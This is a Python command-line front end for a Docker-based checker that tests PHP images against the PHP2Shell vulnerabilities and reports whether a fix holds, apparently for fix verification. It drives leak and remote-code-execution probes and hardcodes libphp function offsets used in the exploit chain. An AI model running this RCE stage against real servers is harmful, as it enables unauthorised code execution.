"""Command line interface for the PHP2Shell lab checker."""
from __future__ import annotations

import argparse
import json
import sys
import time
import uuid
from dataclasses import asdict
from pathlib import Path
from typing import Any

from . import __version__, leak as leakmod
from .engine import (BacktraceOutcome, Engine, EngineError, Offsets,
                     RceOutcome, probe_backtrace)
from .lab import Lab, LabError, OUT_DIR, RUNS_DIR

VULN84 = "php:8.4.26-apache@sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a"
FIXED84 = "php:8.4.27-apache@sha256:a0b75cee7023ba2c127138dcad2ecc6ec7e09435534645e70450f29f24ea2a5a"
VULN85 = "php:8.5.11-apache@sha256:47e6d8849049375e0d19e81f1b391ed88828d4653e0d1b00822185b66b564e8b"
FIXED85 = "php:8.5.12-apache@sha256:e25ab14ef2cfec3bab9dd66c6cf871691146f428fbd72241b1a2c38fcacf92f5"

KNOWN_8426 = {"zval_ptr_dtor": 0x65EB60, "zif_system": 0x465370}


def _outcome_dict(outcome: RceOutcome | BacktraceOutcome | None) -> dict[str, Any] | None:
    if outcome is None:
        return None
    data = asdict(outcome)
    if isinstance(outcome, RceOutcome) and outcome.leak is not None:
        data["leak"] = outcome.leak.summary()
    elif isinstance(outcome, RceOutcome):
        data["leak"] = None
    if isinstance(outcome, BacktraceOutcome):
        data["logs"] = outcome.logs[-4000:]
    return data


def _offsets(lab: Lab, image: str) -> Offsets:
    try:
        return Offsets.from_dict(lab.offsets())
    except Exception as exc:
        if "8.4.26" in image:
            print("  offsets: ELF parse failed (%s); using known 8.4.26 offsets" % exc)
            return Offsets.from_dict(KNOWN_8426)
        raise EngineError("cannot derive libphp offsets: %s" % exc)


def _new_run(prefix: str) -> tuple[str, Path]:
    run_id = time.strftime("%Y%m%d-%H%M%S") + "-" + prefix + "-" + uuid.uuid4().hex[:6]
    path = RUNS_DIR / run_id
    path.mkdir(parents=True, exist_ok=True)
    return run_id, path


def run_verify(control: str, candidate: str, attempts: int = 3,
               docker: str = "docker", evidence_root: Path | None = None,
               keep: bool = False, deep: bool = True) -> tuple[dict, int]:
    run_id, root = _new_run("verify")
    if evidence_root is not None:
        root = Path(evidence_root)
        root.mkdir(parents=True, exist_ok=True)
    report: dict[str, Any] = {
        "run_id": run_id,
        "tool": "php2shell-check",
        "version": __version__,
        "started": time.strftime("%Y-%m-%dT%H:%M:%S"),
        "control_image": control,
        "candidate_image": candidate,
        "attempts": attempts,
        "control": {},
        "candidate": {},
    }

    control_engine = None
    control_lab = None
    try:
        print("[control] %s" % control)
        control_lab, control_engine = _start_target(control, "control", root, docker, attempts)
        report["control"]["config"] = control_lab.effective_config()
        report["control"]["offsets"] = {"zval_ptr_dtor": hex(control_engine.offsets.dtor),
                                        "zif_system": hex(control_engine.offsets.zif)}
        control_outcome = control_engine.run_rce()
        if control_outcome.status != "VULNERABLE_RCE":
            print("[control] RCE stage failed (%s); trying leak only" % control_outcome.detail)
            try:
                found = control_engine.probe_leak()
                control_outcome = RceOutcome(status="VULNERABLE_LEAK", leak=found,
                                             attempts=attempts,
                                             detail="stale-session leak confirmed",
                                             logs=control_engine.logs)
            except (EngineError, OSError) as exc:
                control_outcome.detail = "%s; leak retry: %s" % (control_outcome.detail, exc)
        report["control"]["result"] = _outcome_dict(control_outcome)
        print("[control] %s%s" % (control_outcome.status,
                                  (" proof=" + (control_outcome.proof or "")) if control_outcome.proof else ""))
    except (LabError, EngineError, OSError) as exc:
        report["control"]["error"] = str(exc)
        report["verdict"] = "INCONCLUSIVE"
        report["exit_code"] = 2
        _save_report(root, report)
        print("[control] ERROR: %s" % exc)
        print("verdict: INCONCLUSIVE")
        return report, 2
    finally:
        if control_lab is not None:
            report["control"]["worker_pids"] = control_lab.worker_pids()
            report["control"]["logs_tail"] = control_lab.logs()[-6000:]
            if not keep:
                control_lab.stop()
            else:
                print("[control] kept container %s" % control_lab.name)

    candidate_lab = None
    try:
        print("[candidate] %s" % candidate)
        candidate_lab, candidate_engine = _start_target(candidate, "candidate", root, docker, attempts)
        report["candidate"]["config"] = candidate_lab.effective_config()
        report["candidate"]["offsets"] = {"zval_ptr_dtor": hex(candidate_engine.offsets.dtor),
                                          "zif_system": hex(candidate_engine.offsets.zif)}
        found = None
        try:
            found = candidate_engine.probe_leak()
        except (EngineError, leakmod.LeakError, OSError) as exc:
            report["candidate"]["leak_error"] = str(exc)
            print("[candidate] no leak: %s" % exc)

        if found is not None:
            if deep:
                deep_outcome = candidate_engine.run_rce()
                candidate_outcome = deep_outcome
                if deep_outcome.status == "FAILED":
                    candidate_outcome = RceOutcome(status="VULNERABLE_LEAK", leak=found,
                                                   attempts=attempts,
                                                   detail="leak confirmed; RCE stage failed",
                                                   logs=candidate_engine.logs)
            else:
                candidate_outcome = RceOutcome(status="VULNERABLE_LEAK", leak=found,
                                               attempts=attempts,
                                               detail="stale-session leak confirmed",
                                               logs=candidate_engine.logs)
        else:
            if candidate_lab.health():
                candidate_outcome = RceOutcome(status="PATCHED", attempts=attempts,
                                               detail="no leak, no RCE, target healthy")
            else:
                candidate_outcome = RceOutcome(status="INCONCLUSIVE", attempts=attempts,
                                               detail="no leak but target is unhealthy")
        report["candidate"]["result"] = _outcome_dict(candidate_outcome)
        print("[candidate] %s" % candidate_outcome.status)
    except (LabError, EngineError, OSError) as exc:
        report["candidate"]["error"] = str(exc)
        report["verdict"] = "INCONCLUSIVE"
        report["exit_code"] = 2
        _save_report(root, report)
        print("[candidate] ERROR: %s" % exc)
        print("verdict: INCONCLUSIVE")
        return report, 2
    finally:
        if candidate_lab is not None:
            report["candidate"]["worker_pids"] = candidate_lab.worker_pids()
            report["candidate"]["logs_tail"] = candidate_lab.logs()[-6000:]
            if not keep:
                candidate_lab.stop()
            else:
                print("[candidate] kept container %s" % candidate_lab.name)

    control_vuln = report["control"].get("result", {}).get("status") in (
        "VULNERABLE_RCE", "VULNERABLE_LEAK")
    candidate_vuln = report["candidate"].get("result", {}).get("status") in (
        "VULNERABLE_RCE", "VULNERABLE_LEAK")
    if not control_vuln:
        verdict, code = "INCONCLUSIVE", 2
    elif candidate_vuln:
        verdict, code = "CANDIDATE VULNERABLE", 1
    else:
        verdict, code = "FIX VERIFIED", 0
    report["verdict"] = verdict
    report["exit_code"] = code
    report["evidence_dir"] = str(root)
    _save_report(root, report)
    print("verdict: %s" % verdict)
    print("evidence: %s" % root)
    return report, code


def _start_target(image: str, role: str, root: Path, docker: str,
                  attempts: int) -> tuple[Lab, Engine]:
    evidence = root / role
    evidence.mkdir(parents=True, exist_ok=True)
    lab = Lab(image=image, role=role, docker=docker, out_dir=evidence / "out")
    lab.start()
    offsets = _offsets(lab, image)
    engine = Engine(lab, offsets, evidence, retries=attempts)
    return lab, engine


def _save_report(root: Path, report: dict) -> None:
    (root / "report.json").write_text(json.dumps(report, indent=2) + "\n")


def run_backtrace(control: str, candidate: str, docker: str = "docker",
                  evidence_root: Path | None = None, keep: bool = False,
                  negative_control: bool = True,
                  producer: str = "/fatal.php?mode=user_error") -> tuple[dict, int]:
    run_id, root = _new_run("backtrace")
    if evidence_root is not None:
        root = Path(evidence_root)
        root.mkdir(parents=True, exist_ok=True)
    report: dict[str, Any] = {
        "run_id": run_id,
        "tool": "php2shell-check",
        "version": __version__,
        "started": time.strftime("%Y-%m-%dT%H:%M:%S"),
        "probe": "backtrace",
        "control_image": control,
        "candidate_image": candidate,
    }

    def probe(image: str, role: str, enable: bool) -> BacktraceOutcome:
        evidence = root / role
        lab = Lab(image=image, role=role, docker=docker,
                  out_dir=evidence / "out", fatal_backtraces=1 if enable else 0)
        try:
            lab.start()
            result = probe_backtrace(lab, enable=enable, evidence_dir=evidence,
                                     producer=producer)
            result.logs = lab.logs()[-6000:]
            return result
        finally:
            if not keep:
                lab.stop()
            else:
                print("[%s] kept container %s" % (role, lab.name))

    try:
        print("[control] %s with fatal_error_backtraces=1" % control)
        control_on = probe(control, "control-on", True)
        print("[control] %s" % control_on.status)
        control_off = None
        if negative_control:
            print("[control] %s with fatal_error_backtraces=0" % control)
            control_off = probe(control, "control-off", False)
            print("[control] %s" % control_off.status)
        print("[candidate] %s with fatal_error_backtraces=1" % candidate)
        candidate_on = probe(candidate, "candidate-on", True)
        print("[candidate] %s" % candidate_on.status)
    except (LabError, OSError) as exc:
        report["error"] = str(exc)
        report["verdict"] = "INCONCLUSIVE"
        report["exit_code"] = 2
        _save_report(root, report)
        print("ERROR: %s" % exc)
        print("verdict: INCONCLUSIVE")
        return report, 2

    report["control_on"] = _outcome_dict(control_on)
    report["control_off"] = _outcome_dict(control_off)
    report["candidate_on"] = _outcome_dict(candidate_on)

    control_positive = control_on.status == "VULNERABLE_CRASH"
    control_specific = control_off is None or control_off.status != "VULNERABLE_CRASH"
    candidate_positive = candidate_on.status == "VULNERABLE_CRASH"
    if candidate_positive:
        verdict, code = "CANDIDATE VULNERABLE", 1
    elif control_positive and control_specific:
        verdict, code = "FIX VERIFIED", 0
    else:
        verdict, code = "INCONCLUSIVE", 2
    report["verdict"] = verdict
    report["exit_code"] = code
    report["evidence_dir"] = str(root)
    _save_report(root, report)
    print("verdict: %s" % verdict)
    print("evidence: %s" % root)
    return report, code


def run_selftest(docker: str, keep: bool) -> int:
    print("=== 8.4 mod_php: OOM + stale session (full RCE) ===")
    _, verify_code = run_verify(VULN84, FIXED84, attempts=3, docker=docker, keep=keep)
    print()
    print("=== 8.5 mod_php: fatal backtrace + early INI diagnostic ===")
    _, backtrace_code = run_backtrace(VULN85, FIXED85, docker=docker, keep=keep)
    if verify_code == 0 and backtrace_code in (0, 2):
        return 0
    return max(verify_code, backtrace_code)


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="php2shell-check",
        description="Differential checker for PHP2Shell (CVE-2026-109618 / 109619).",
    )
    parser.add_argument("--version", action="version", version=__version__)
    sub = parser.add_subparsers(dest="command", required=True)

    verify = sub.add_parser("verify", help="verify a candidate fix against a vulnerable control")
    verify.add_argument("--control", default=VULN84)
    verify.add_argument("--candidate", default=FIXED84)
    verify.add_argument("--attempts", type=int, default=3)
    verify.add_argument("--docker", default="docker")
    verify.add_argument("--evidence", type=Path, default=None)
    verify.add_argument("--keep", action="store_true")
    verify.add_argument("--no-deep", action="store_true",
                        help="do not run the full RCE stage on a leaking candidate")

    backtrace = sub.add_parser("backtrace", help="8.5 fatal-backtrace + early-INI probe")
    backtrace.add_argument("--control", default=VULN85)
    backtrace.add_argument("--candidate", default=FIXED85)
    backtrace.add_argument("--docker", default="docker")
    backtrace.add_argument("--evidence", type=Path, default=None)
    backtrace.add_argument("--keep", action="store_true")
    backtrace.add_argument("--no-negative-control", action="store_true")
    backtrace.add_argument("--producer", default="/fatal.php?mode=user_error",
                           help="producer path, e.g. /fatal.php?mode=oom or /parse.php")

    probe = sub.add_parser("probe", help="run one probe against one image")
    probe.add_argument("--image", required=True)
    probe.add_argument("--probe", choices=("rce", "leak", "backtrace"), default="leak")
    probe.add_argument("--attempts", type=int, default=3)
    probe.add_argument("--docker", default="docker")
    probe.add_argument("--evidence", type=Path, default=None)
    probe.add_argument("--keep", action="store_true")
    probe.add_argument("--producer", default="/fatal.php?mode=user_error",
                       help="producer path for --probe backtrace")

    selftest = sub.add_parser("selftest", help="run 8.4 RCE and 8.5 backtrace self-tests")
    selftest.add_argument("--docker", default="docker")
    selftest.add_argument("--keep", action="store_true")

    return parser


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    try:
        if args.command == "verify":
            _, code = run_verify(args.control, args.candidate, args.attempts, args.docker,
                                 args.evidence, args.keep, not args.no_deep)
            return code
        if args.command == "backtrace":
            _, code = run_backtrace(args.control, args.candidate, args.docker,
                                    args.evidence, args.keep, not args.no_negative_control,
                                    args.producer)
            return code
        if args.command == "probe":
            return _run_single_probe(args)
        if args.command == "selftest":
            return run_selftest(args.docker, args.keep)
    except KeyboardInterrupt:
        print("interrupted", file=sys.stderr)
        return 130
    except (LabError, EngineError, OSError) as exc:
        print("error: %s" % exc, file=sys.stderr)
        return 2
    return 2


def _run_single_probe(args: argparse.Namespace) -> int:
    run_id, root = _new_run("probe-" + args.probe)
    if args.evidence is not None:
        root = Path(args.evidence)
        root.mkdir(parents=True, exist_ok=True)
    evidence = root / args.probe
    evidence.mkdir(parents=True, exist_ok=True)
    fatal = 1 if args.probe == "backtrace" else None
    lab = Lab(image=args.image, role=args.probe, docker=args.docker,
              out_dir=evidence / "out", fatal_backtraces=fatal)
    try:
        lab.start()
        print("config: %s" % json.dumps(lab.effective_config()))
        if args.probe == "backtrace":
            outcome = probe_backtrace(lab, enable=True, evidence_dir=evidence,
                                      producer=args.producer)
            print("result: %s" % outcome.status)
            print(outcome.detail)
            return 0 if outcome.status == "VULNERABLE_CRASH" else 1
        offsets = _offsets(lab, args.image)
        engine = Engine(lab, offsets, evidence, retries=args.attempts)
        if args.probe == "leak":
            found = engine.probe_leak()
            print("result: VULNERABLE_LEAK")
            print(json.dumps(found.summary(), indent=2))
            return 0
        outcome = engine.run_rce()
        print("result: %s" % outcome.status)
        if outcome.proof:
            print("proof:\n%s" % outcome.proof)
        return 0 if outcome.status == "VULNERABLE_RCE" else 1
    finally:
        if not args.keep:
            lab.stop()
        else:
            print("kept container %s" % lab.name)


if __name__ == "__main__":
    raise SystemExit(main())
